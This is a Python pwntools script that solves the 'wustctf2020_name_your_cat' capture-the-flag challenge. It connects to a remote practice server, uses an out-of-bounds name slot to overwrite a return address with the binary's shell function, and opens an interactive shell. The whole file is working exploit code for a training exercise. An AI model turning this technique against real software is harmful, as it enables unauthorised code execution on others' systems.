from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wustctf2020_name_your_cat')
io = remote('node4.buuoj.cn', 26420)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('wustctf2020_name_your_cat')
shell = elf.sym['shell']

for i in range(4):
	io.sendlineafter('Name for which?\n>', '0')
	io.sendlineafter('Give your name plz: ', 'a')

io.sendlineafter('Name for which?\n>', '7')
io.sendlineafter('Give your name plz: ', p32(shell))
io.interactive()

